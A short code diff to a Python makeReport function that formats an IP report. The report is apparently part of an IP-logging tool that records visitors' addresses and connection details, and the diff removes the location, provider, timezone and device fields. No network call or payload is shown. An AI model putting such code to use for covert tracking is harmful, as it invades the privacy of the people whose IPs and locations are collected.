@@ -152,17 +152,8 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
 > **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-
-**Device Info:**
-> **OS:** `{os}`
-> **Browser:** `{browser}`""",
+> **VPN:** `{info['proxy']}`""",
     }
   ],
 }
